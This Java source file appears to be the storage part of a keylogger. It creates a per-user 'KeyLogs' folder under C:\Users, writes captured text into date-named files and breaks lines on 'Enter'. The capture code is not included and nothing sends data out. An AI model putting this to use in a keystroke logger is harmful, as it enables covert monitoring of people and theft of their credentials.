package main;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;

public class WriteLogsInToFile {

	private static final String PATH_TO_FOLDER = "C:\\Users";
	private static final String FOLDER_NAME = "KeyLogs";
	private static final String USER_NAME = System.getProperty("user.name");

	public void addToFile(String text) {
		checkDirectory();
		checkFile();
		appendToCheckbook(text + " ");
	}

	private void checkDirectory() {
		File pathToFolder = new File(PATH_TO_FOLDER + File.separator + USER_NAME + File.separator + FOLDER_NAME);
		if (!pathToFolder.exists()) {
			pathToFolder.mkdirs();
		}
	}

	private void checkFile() {
		File f = null;
		boolean bool = false;

		try {
			f = new File(PATH_TO_FOLDER + File.separator + USER_NAME + File.separator + FOLDER_NAME + File.separator + getFileName());
			// tests if file exists
			bool = f.exists();
			if (!bool) {
				// create new file in the system
				f.createNewFile();
			}
			// prints
		} catch (Exception e) {
			// if any error occurs
			e.printStackTrace();
		}
	}

	private void appendToCheckbook(String text) {

		BufferedWriter bw = null;

		try {
			// APPEND MODE SET HERE
			bw = new BufferedWriter(new FileWriter(PATH_TO_FOLDER + File.separator + USER_NAME + File.separator + FOLDER_NAME + File.separator + getFileName(), true));
			bw.write(text);
			if (text.contains("Enter")) {
				bw.write('\n');
				bw.newLine();
			}
			bw.flush();
		} catch (IOException ioe) {
			ioe.printStackTrace();
		} finally { // always close the file
			if (bw != null)
				try {
					bw.close();
				} catch (IOException ioe2) {
					// just ignore it
				}
		}

	}

	private String getFileName() {
		String pattern = "yyyyMMdd";
		DateFormat dateFormat = new SimpleDateFormat(pattern);
		Date date = new Date();
		String now = dateFormat.format(date).toString();
		return now.toString();
	}
}
